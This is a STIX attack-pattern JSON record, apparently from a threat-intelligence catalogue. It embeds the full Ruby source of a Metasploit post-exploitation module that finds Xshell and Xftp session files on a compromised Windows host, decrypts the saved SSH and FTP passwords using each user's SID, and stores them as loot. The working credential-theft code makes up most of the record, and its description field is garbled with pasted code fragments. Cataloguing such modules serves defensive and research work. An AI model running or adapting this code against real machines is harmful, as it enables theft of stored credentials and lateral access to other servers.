{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8e68ef12-3f8f-4d85-9c1f-9bb5b6352d7f",
    "created": "2024-08-14T16:33:08.233027Z",
    "modified": "2024-08-14T16:33:08.233032Z",
    "name": "Windows Gather Xshell and Xftp Passwords",
    "description": " This module can decrypt the password of xshell and xftp if the user chooses to remember the password.  'License' => MSF_LICENSE 'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/xshell_xftp_password.rb",
            "external_id": "xshell_xftp_password.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::File\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::Accounts\n  include Rex::Parser::NetSarang\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Xshell and Xftp Passwords',\n        'Description' => %q{\n          This module can decrypt the password of xshell and xftp,\n          if the user chooses to remember the password.\n        },\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://github.com/HyperSine/how-does-Xmanager-encrypt-password/blob/master/doc/how-does-Xmanager-encrypt-password.md']\n        ],\n        'Author' => [\n          'Kali-Team <kali-team[at]qq.com>'\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_search\n              stdapi_fs_separator\n              stdapi_fs_stat\n            ]\n          }\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('MASTER_PASSWORD', [ false, 'If the user sets the master password, e.g.:123456']),\n      ]\n    )\n  end\n\n  def try_encode_file(data)\n    # version 6.0 The character set of the session file will use Unicode\n    # version <= 5.3 The character set of the session file will use ANSI\n    if data[0].unpack('C') == [255] && data[1].unpack('C') == [254]\n      data[2..].force_encoding('UTF-16LE').encode('UTF-8')\n    elsif data[0].unpack('C') == [254] && data[1].unpack('C') == [187] && data[2].unpack('C') == [191]\n      data\n    elsif data[0].unpack('C') == [254] && data[1].unpack('C') == [255]\n      data[2..].force_encoding('UTF-16BE').encode('UTF-8')\n    else\n      data\n    end\n  end\n\n  def enable_master_passwd?(version_6_path)\n    file_name = expand_path(\"#{version_6_path}\\\\Common\\\\MasterPassword.mpw\")\n    file_contents = read_file(file_name) if session.fs.file.exist?(file_name)\n    if file_contents.nil? || file_contents.empty?\n      return false\n    end\n\n    file = try_encode_file(file_contents)\n    file.include?('EnblMasterPasswd=1')\n  end\n\n  def net_sarang_store_config(config)\n    service_data = {\n      address: config[:host],\n      port: config[:port],\n      service_name: config[:type],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :session,\n      session_id: session_db_id,\n      post_reference_name: refname,\n      private_type: :password,\n      private_data: config[:password],\n      username: config[:username]\n    }.merge(service_data)\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def enum_session_file(path, user_profiles)\n    xsh_xfp = []\n    tbl = []\n    print_status(\"Search session files on #{path}\")\n    xsh_xfp += session.fs.file.search(path, '*.xsh')\n    xsh_xfp += session.fs.file.search(path, '*.xfp')\n\n    # enum session file\n    xsh_xfp.each do |item|\n      file_name = item['path'] + session.fs.file.separator + item['name']\n      file_contents = read_file(file_name)\n      if file_contents.nil? || file_contents.empty?\n        print_status \"Skipping empty file: #{file_name}\"\n        next\n      end\n\n      file = try_encode_file(file_contents)\n      session_type = (File.extname(file_name) == '.xsh') ? 'Xshell' : 'Xftp'\n\n      # parser configure file\n      if session_type == 'Xshell'\n        version, host, port, username, password = parser_xsh(file)\n      else\n        version, host, port, username, password = parser_xfp(file)\n      end\n\n      # decrypt password\n      if enable_master_passwd?(path)\n        net_sarang = NetSarangCrypto.new(session_type, version, user_profiles['UserName'], user_profiles['SID'], datastore['MASTER_PASSWORD'])\n      else\n        net_sarang = NetSarangCrypto.new(session_type, version, user_profiles['UserName'], user_profiles['SID'])\n      end\n      plaintext = net_sarang.decrypt_string(password) if password\n      print_error('Invalid MASTER_PASSWORD, Decryption failed!') if !plaintext && password\n      tbl << {\n        version: \"#{session_type}_V\" + version.to_s,\n        file_name: item['name'],\n        host: host,\n        port: port,\n        username: username,\n        plaintext: plaintext,\n        password: password\n      }\n    end\n    return tbl\n  end\n\n  def run\n    print_status(\"Gather Xshell and Xftp Passwords on #{sysinfo['Computer']}\")\n    profiles = grab_user_profiles\n    result = []\n    profiles.each do |user_profiles|\n      next if user_profiles['SID'].nil?\n\n      parent_key_6 = \"HKEY_USERS\\\\#{user_profiles['SID']}\\\\Software\\\\NetSarang\\\\Common\\\\6\\\\UserData\"\n      parent_key_5 = \"HKEY_USERS\\\\#{user_profiles['SID']}\\\\Software\\\\NetSarang\\\\Common\\\\5\\\\UserData\"\n      # get session file path\n      net_sarang_path_6 = expand_path(registry_getvaldata(parent_key_6, 'UserDataPath'))\n      net_sarang_path_5 = expand_path(registry_getvaldata(parent_key_5, 'UserDataPath'))\n\n      # enum session file\n      result += enum_session_file(net_sarang_path_5, user_profiles) if session.fs.file.exist?(net_sarang_path_5)\n      result += enum_session_file(net_sarang_path_6, user_profiles) if session.fs.file.exist?(net_sarang_path_6)\n    end\n    columns = [\n      'Type',\n      'Name',\n      'Host',\n      'Port',\n      'UserName',\n      'Plaintext',\n      'Password'\n    ]\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Xshell and Xftp Password',\n      'Columns' => columns\n    )\n    result.each do |item|\n      tbl << item.values\n      config = {\n        type: item[:version].starts_with?('Xshell') ? 'ssh' : 'ftp',\n        host: item[:host],\n        port: item[:port].to_i,\n        username: item[:username],\n        password: item[:plaintext]\n      }\n      net_sarang_store_config(config)\n    end\n    print_line(tbl.to_s)\n    # Only save data to disk when there's something in the table\n    if tbl.rows.count\n      path = store_loot('host.xshell_xftp_password', 'text/plain', session, tbl, 'xshell_xftp_password.txt', 'Xshell Xftp Passwords')\n      print_good(\"Passwords stored in: #{path}\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}